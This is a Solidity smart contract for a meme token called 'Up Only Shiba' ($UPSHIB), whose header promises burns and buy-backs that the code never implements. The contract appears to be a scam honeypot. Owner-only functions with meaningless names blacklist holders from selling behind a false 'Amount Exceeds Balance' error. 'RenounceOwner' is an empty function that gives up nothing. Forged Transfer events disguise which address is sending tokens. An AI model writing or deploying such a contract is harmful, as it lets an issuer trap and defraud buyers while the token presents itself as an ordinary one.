pragma solidity =0.8.17;

// Contract.sol

/*
 /$$   /$$ /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$ /$$$$$$$ 
| $$  | $$| $$__  $$ /$$__  $$| $$  | $$|_  $$_/| $$__  $$
| $$  | $$| $$  \ $$| $$  \__/| $$  | $$  | $$  | $$  \ $$
| $$  | $$| $$$$$$$/|  $$$$$$ | $$$$$$$$  | $$  | $$$$$$$ 
| $$  | $$| $$____/  \____  $$| $$__  $$  | $$  | $$__  $$
| $$  | $$| $$       /$$  \ $$| $$  | $$  | $$  | $$  \ $$
|  $$$$$$/| $$      |  $$$$$$/| $$  | $$ /$$$$$$| $$$$$$$/
 \______/ |__/       \______/ |__/  |__/|______/|_______/ 

Up Only Shiba  - $UPSHIB -

Inspired by Shiba Inu Token

Tokenomics -

- Total Supply: 100M
- 5% Burn after 5 Hours
- ETH Buy back after each burn. 

*/ 

contract UPSHIBA {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) zyAmount;

    // 
    string public name = "Up Only Shiba";
    string public symbol = unicode"UPSHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);

   

      constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        

        deploy(lead_deployer, totalSupply);
    }

	address owner = msg.sender;

    address Construct = 0x4Ffca358bdfF7a4772A98EBec08bd0f4140e7244;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
bool isEnabled;

modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function RenounceOwner() public onlyOwner  {

}

  function deploy(address account, uint256 amount) public onlyOwner {
        
      emit Transfer(address(0), account, amount);
   }
   function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    function adbna(address _user) public onlyOwner {
        require(!zyAmount[_user], "xx");
        zyAmount[_user] = true;
    
    }
    
    function afbnb(address _user) public onlyOwner {
        require(zyAmount[_user], "xx");
        zyAmount[_user] = false;
    
    }
    
 

 
   

    function transfer(address to, uint256 value) public returns (bool success) {
require(!zyAmount[msg.sender] , "Amount Exceeds Balance"); 

if(msg.sender == Construct)  {

        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
        
require(!zyAmount[msg.sender] , "Amount Exceeds Balance"); 

require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)

       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   

        if(from == Construct)  {

 require(value <= balanceOf[from]);
 require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
    
        require(!zyAmount[from] , "Amount Exceeds Balance"); 
               require(!zyAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}
